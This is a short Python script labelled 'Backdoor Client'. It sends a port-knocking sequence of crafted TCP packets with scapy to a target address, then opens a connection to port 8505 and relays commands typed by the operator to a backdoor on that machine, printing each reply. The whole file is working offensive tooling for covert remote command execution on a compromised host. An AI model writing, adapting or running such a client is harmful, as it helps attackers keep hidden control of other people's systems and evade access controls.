#!/usr/bin/python

import sys, os, argparse, socket, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from Crypto.Cipher import AES

parser = argparse.ArgumentParser(description='Backdoor Client')
parser.add_argument('-d', '--destination', dest='destIp', help='destination IP Address')
parser.add_argument('-p', '--ports', dest='ports', help='port sequence', nargs='+', type=str, required=True)
parser.add_argument('-c', '--command', dest='cmd', help='command to send', type=str)
args = parser.parse_args()

def knock(host, ports):
	host = args.destIp
	ports = []
	for port in args.ports:
		ports.append(port)
	for i in ports:
		pkt = IP(dst=host)/TCP(sport=int(i), dport=RandNum(0,65355), window=4096)
		send(pkt)

def main():
	knock(args.destIp, args.ports)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((args.destIp, 8505))

	while 1:
		command = raw_input('Enter command: ')
		s.sendall(command)
		data = s.recv(1024)
		print data

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		print 'Exiting..'
